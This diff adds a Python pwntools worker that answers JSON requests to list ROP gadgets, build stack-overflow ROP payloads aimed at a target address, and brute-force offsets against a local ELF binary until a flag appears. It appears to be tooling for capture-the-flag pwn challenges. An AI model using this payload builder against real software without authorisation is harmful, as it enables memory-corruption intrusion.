@@ -1,0 +1,149 @@
+"""常驻 pwntools worker（在 WSL 里运行）。
+
+stdin/stdout 按行交换 JSON：
+    请求  {"id": 1, "op": "ping"}
+    响应  {"id": 1, "ok": true, "error": null, "data": {...}}
+
+op:
+    ping      返回 pwntools 版本
+    gadgets   {"path"} → 可用 gadget 列表（分析用，不执行）
+    build     {"path","target","mode","arg","offset"} → payload 十六进制
+    run       {"path","target","mode","arg","offsets","flag","timeout"}
+              → 在 worker 进程内逐个偏移尝试，返回 solved/offset/output
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import sys
+import time
+
+context = None
+ELF = None
+ROP = None
+p64 = None
+process = None
+
+try:
+    from pwn import ELF, ROP, context, p64, process
+
+    context.log_level = "error"
+except ImportError as error:  # pragma: no cover - 环境缺失时如实报告
+    IMPORT_ERROR = str(error)
+else:
+    IMPORT_ERROR = None
+
+
+_CACHE: dict[tuple[str, float, int], object] = {}
+
+
+def _elf(path: str):
+    stat = os.stat(path)
+    key = (path, stat.st_mtime, stat.st_size)
+    cached = _CACHE.get(key)
+    if cached is None:
+        _CACHE.clear()
+        cached = ELF(path, checksec=False)
+        _CACHE[key] = cached
+    return cached
+
+
+def _build(elf, target: int, mode: str, arg: int, offset: int) -> tuple[bytes, str]:
+    rop = ROP(elf)
+    try:
+        ret = rop.find_gadget(["ret"]).address
+    except Exception:  # noqa: BLE001 - ret 只用于对齐
+        ret = None
+    payload = b"A" * offset
+    if mode == "none":
+        if ret is not None:
+            payload += p64(ret)
+        return payload + p64(target), "ret"
+    if mode == "rdi":
+        gadget = rop.find_gadget(["pop rdi", "ret"])
+        if gadget is None:
+            raise RuntimeError("gadget_missing:pop rdi;ret")
+        if ret is not None:
+            payload += p64(ret)
+        return payload + p64(gadget.address) + p64(arg) + p64(target), \
+            f"pop rdi;ret@{hex(gadget.address)}"
+    if mode == "rsi_rbp":
+        gadget = rop.find_gadget(["pop rsi", "pop rbp", "ret"])
+        if gadget is None:
+            raise RuntimeError("gadget_missing:pop rsi;pop rbp;ret")
+        if ret is not None:
+            payload += p64(ret)
+        return payload + p64(gadget.address) + p64(arg) + p64(0) + p64(target), \
+            f"pop rsi;pop rbp;ret@{hex(gadget.address)}"
+    raise RuntimeError(f"unknown mode: {mode}")
+
+
+def _handle(request: dict) -> dict:
+    if IMPORT_ERROR is not None:
+        return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
+    op = request.get("op")
+    try:
+        if op == "ping":
+            from importlib.metadata import version
+
+            return {"ok": True, "data": {"version": version("pwntools")}}
+        if op == "gadgets":
+            elf = _elf(request["path"])
+            rop = ROP(elf)
+            gadgets = [
+                {"address": item.address, "insns": list(item.insns)}
+                for item in rop.gadgets.values()
+            ]
+            gadgets.sort(key=lambda item: item["address"])
+            return {"ok": True, "data": {"count": len(gadgets), "gadgets": gadgets[:300]}}
+        if op == "build":
+            elf = _elf(request["path"])
+            payload, gadget = _build(elf, int(request["target"]), request["mode"],
+                                     int(request.get("arg", 0)), int(request["offset"]))
+            return {"ok": True, "data": {"payload": payload.hex(), "gadget": gadget}}
+        if op == "run":
+            started = time.perf_counter()
+            elf = _elf(request["path"])
+            target = int(request["target"])
+            flag = str(request["flag"])
+            timeout = float(request.get("timeout", 5))
+            attempts = 0
+            for offset in request["offsets"]:
+                attempts += 1
+                payload, gadget = _build(elf, target, request["mode"],
+                                         int(request.get("arg", 0)), int(offset))
+                io = process(elf.path)
+                io.send(payload)
+                output = io.recvall(timeout=timeout) or b""
+                io.close()
+                text = output.decode("utf-8", "replace")
+                if flag.lower() in text.lower():
+                    return {"ok": True, "data": {
+                        "solved": True, "offset": offset, "attempts": attempts,
+                        "gadget": gadget,
+                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+            return {"ok": True, "data": {
+                "solved": False, "offset": None, "attempts": attempts,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+        return {"ok": False, "error": f"unknown_op:{op}"}
+    except Exception as error:  # noqa: BLE001 - worker 必须把失败变成结构化响应
+        return {"ok": False, "error": f"{type(error).__name__}:{error}"}
+
+
+def main() -> None:
+    for line in sys.stdin:
+        line = line.strip()
+        if not line:
+            continue
+        try:
+            request = json.loads(line)
+        except ValueError:
+            continue
+        response = {"id": request.get("id")}
+        response.update(_handle(request))
+        print(json.dumps(response), flush=True)
+
+
+if __name__ == "__main__":
+    main()
